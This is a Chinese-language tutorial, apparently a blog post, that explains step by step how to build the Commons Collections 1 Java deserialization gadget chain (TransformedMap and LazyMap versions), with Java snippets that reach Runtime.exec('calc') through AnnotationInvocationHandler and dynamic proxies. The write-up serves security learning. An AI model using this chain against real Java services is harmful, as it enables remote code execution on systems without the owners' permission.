0x01 几个关键的接口和类

TransformedMap


TransformedMap的作用是对Map做一个修饰，被修饰过的Map在添加新的元素时，将可以执行一个回调。我们主要用这个类中的decorate()来衔接chains



Transformer


Transformer是一个接口，他只有一个方法transform()，这将是解锁计算器的关键方法



ConstantTransformer


它实现了Transformer，它的作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作



InvokerTransformer


它同样实现了Transformer，它的作用就是安静的当个后门



ChainedTransformer


它同样实现了Transformer，作用是将内部的多个Transformer串在一起。通俗来说就是，前一个回调返回的结果，作为后一个回调的参数传入




0x02 CommonsCollections1（TransformedMap版）


上文我们说InvokeTransformer是一个后门，为什么这么说，我们写一个Demo

package Ser;
import org.apache.commons.collections.functors.InvokerTransformer;
public class CC1Demo{    public static void main(String[] args) {        new InvokerTransformer(                "exec",                new Class[]{String.class},                new Object[]{"calc"}).transform(Runtime.getRuntime());    }}


运行即可解锁计算器，这得益于它将Java的反射机制封装成了两个方法，一是它自己的构造方法，二是自己的transform方法



其实换成反射写法就是这样

Runtime.class.getMethod("exec", String.class).invoke(Runtime.class.getMethod("getRuntime").invoke(null),"calc");


那么此时我们就应该关注那些类动态调用了这个transform方法，这里可以选中transform，按Alt+F7找一下usage，这里我们找到TransformedMap#checkSetValue()



之前我们说过，要用decorate()去装饰，这里用到的设计模式就是一个装饰者模式，同时checkSetValue()也是一个protected方法，所以我们要用反射去调它

package Ser;
import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;
import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;
public class CC1Demo{    public static void main(String[] args) throws Exception{        InvokerTransformer invokerTransformer = new InvokerTransformer(                "exec",                new Class[]{String.class},                new Object[]{"calc"});        TransformedMap decorate = (TransformedMap) TransformedMap.decorate(new HashMap(), null, invokerTransformer);        Method checkSetValue = TransformedMap.class.getDeclaredMethod("checkSetValue", Object.class);        checkSetValue.setAccessible(true);        checkSetValue.invoke(decorate, Runtime.getRuntime());    }}


接下来的任务就是找，谁调用了checkSetValue()，这里来到AbstractInputCheckedMapDecorator这个抽象类中的静态类MapEntry



可以看见这个静态类是实现了AbstractMapEntryDecorator这个抽象类，而这个抽象类又实现了Map.Entry接口



那么我们想要触发MapEntry#setValue()其实就显而易见了，只需要迭代TransformedMap对象，然后使用Map.Entry对象调用setValue()，set的值为Runtime.getRuntime即可实现调用TransformedMap#checkSetValue()



这里有点绕，又是继承又是实现又是重写的，最后还来个迭代，如果不熟悉Map.Entry这个接口，建议先去学习一下，这一步是很关键的一步，必须理解


package Ser;
import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;
public class CC1Demo{    public static void main(String[] args) throws Exception{        InvokerTransformer invokerTransformer = new InvokerTransformer(                "exec",                new Class[]{String.class},                new Object[]{"calc"});        HashMap<Object, Object> map = new HashMap<>();        map.put("test","test");        Map<Object,Object> decorate =  TransformedMap.decorate(map, null, invokerTransformer);        for (Map.Entry entry : decorate.entrySet()) {            entry.setValue(Runtime.getRuntime());        }    }}



那么此时如果有某个readObject()中使用Map.Entry去迭代集合，且中间使用可控变量调用了setValue()，那么我们就可以以这个为入口点，进行反序列化。


还是之前的方法，找usage，来到AnnotationInvocationHandler#readObject()，这里如果你没有导入openjdk的同版本sun包，find usage是无法找到这个类的，因为它在sun包下边，find usage只会找.java文件



可以看到最终是通过memberValue这个变量触发setValue，而memberValue来自memberValues集合，而memberValues又在它的构造方法里，这就符合我们进行反序列化的一切条件



只不过有三个小问题：

  • Runtime没有实现Serialize接口，无法被序列化

  • 触发setValue()之前的两个if条件

  • setValue()中的值是一个AnnotationTypeMismatchExceptionProxy对象

首先来解决第一个，这里我们用InvokerTransformer去实现，反射加载反射，有点意思

Object getMethod = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);Runtime runtime = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getMethod);new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(runtime);


接着我们看一下触发setValue()之前的两个条件：

  • map的键在注解中必须存在

  • 注解的Class不能强转为value


所以这里我们使用的注解为Resource（随便一个有属性值可以遍历的注解即可）



最后一个问题，如何解决setValue()中的值是一个AnnotationTypeMismatchExceptionProxy对象，还记得上文中提到的ChainedTransformer与ConstantTransformer两个类么，一个是链式调用，一个是你给我什么我就返回什么，我们将ConstantTransformer与之前“反射加载反射”的操作，封装到Transformer接口中

Transformer[] transformers = new Transformer[]{    new ConstantTransformer(Runtime.class),    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})};


他们会进行链式调用，然后我们将这个transformers传给ChainedTransformer()

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


最后，把chainedTransformer传给decorate()

Map<Object,Object> decorate =  TransformedMap.decorate(map, null, chainedTransformer);


这时候我们跟一下setValue()之后的操作，首先是绕过两个if，进入到memberValue.setValue()



接着经过Map.Entry迭代，我们的parent变量如愿以偿的变为了TransformedMap类，并且调用自身的checkSetValue()方法



当时我们给TransformedMap.decorate()传的第三个参数是我们构造的chainedTransformer



所以这里就会调用chainedTransformer#transform()，触发链式调用



前面我们给ConstantTransformer()传Runtime.class这时候就派上用场了，它的作用就是将AnnotationTypeMismatchExceptionProxy替换为Runtime

0x03 CommonsCollections1（LazyMap版）


LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的factory.transform。



其实这也好理解，LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用factory.transform 方法去获取一个值：



但是在后续的利用中AnnotationInvocationHandler的readObject()没有直接调用get()，所以ysoserial找到了另一条路，AnnotationInvocationHandler类的invoke方法有调用到get



Java动态代理


如果我们想调用到invoke()，那么就不得不说一下Java的动态代理机制，需要了解两个类：Proxy（生成动态代理）、InvocationHandler（调用处理程序并返回结果），其中有一个比较关键的方法newProxyInstance()



这里有三个参数，我是这么理解的：

  • loader - 类加载器来定义代理类

  • interfaces - 代理类实现的接口列表 （被代理的接口）

  • h - 调度方法调用的调用处理函数 （即InvocationHandler）


这里我用P神的例子，注意看注释


被代理类，它实现了InvocationHandler接口

package ProxyDemo;
import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.util.Map;public class ExampleInvocationHandler implements InvocationHandler{    protected Map map;
    // 构造方法    public ExampleInvocationHandler(Map map) {        this.map = map;    }

    // 重写invoke    // 当这个类被代理后, 代理对象调用任意方法都会优先进入 被代理类的i nvoke方法    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {        if (method.getName().equals("get"))        {            System.out.println("方法 get() 已被劫持 !");            return "Hoooooook";        }        return method.invoke(this.map,args);    }}


测试类，其中proxyMap就是代理类，强转为Map是为了衔接被代理类中的invoke()执行逻辑

package ProxyDemo;
import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;
public class App{    public static void main(String[] args) {        /*            自动生成代理类                第一个参数: Classloader, 及代理角色                第二个参数: Interface, 也就是抽象角色, 即我们要代理那个接口, 这里是Map                第三个参数: InvocationHandler, 是一个实现了InvocationHandler接口的被代理类，里面包含了具体代理的逻辑         */        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class}, new ExampleInvocationHandler(new HashMap()));        // 这里虽然调用的是 Map.put() 但由代理类触发, 就会优先调用 被代理类的invoke() 然后再反射调用 put()        proxyMap.put("Hello","World");        // 因为优先调用被代理类的invoke, 且我们的方法又刚好是 get()        // 所以被 hook住, 返回的值也会变为 Hoooooook        String res = (String) proxyMap.get("Hello");        System.out.println(res);    }}


这里如果你不熟悉动态代理机制，可能会认为输出的结果为“World”，但其实我们的Map对象已经被Hook了，无论调用哪个方法，都会先触发被代理类的invoke()



好了，简单了解了Java的动态代理（这是23种设计模式中的代理模式）后，我们继续


改写Poc


而AnnotationInvocationHandler这个类刚好实现了InvocationHandler接口，那么我们只需要在实例化它的时候，将它使用Proxy.newProxyInstance()代理，即可当代理类调用任意方法的时候，都会优先跑到AnnotationInvocationHandler这个类下的invoke()方法中



改写的大致思路有了，首先将之前的TransformedMap更改类LazyMap

Map<Object,Object> decorate =  LazyMap.decorate(map, chainedTransformer);


然后代理AnnotationInvocationHandler，以便于衔接它自己的invoke()

Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor<?> clazzDeclaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);clazzDeclaredConstructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) clazzDeclaredConstructor.newInstance(Resource.class, decorate);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);


此时是一个代理对象，我们调用任意方法，成功调用invoke()，进而调用get()触发RCE



此时是一个Proxy类，而我们的触发点在AnnotationInvocationHandler#readObject()，所以在把这个类放到构造方法第三个参数

Object o =  clazzDeclaredConstructor.newInstance(Resource.class, proxyMap);


当进入readObject()，使用我们的Proxy对象调用entrySet()的时候，便会进入AnnotationInvocationHandler#invoke()，从而调用get()，形成闭环



最终触发RCE，不得不说很巧妙，对Java的高级特性算是拿捏了

0x04 小结


这一条链（两个版本）我足足写了两天，涉及到的知识点是比较多的，我个人总结了以下几个关键点，如果都掌握了，学习CC链还是比较轻松的（我很困难）：

  • 扎实的SE基础（比如TransformedMap版中的Map.Entry接口）

  • 反射机制（InvokeTransformer为什么是个后门）

  • 动态代理（LazyMap版为什么可以调用get方法）

  • 设计模式（decorate() 的作用以及什么是”懒加载“）
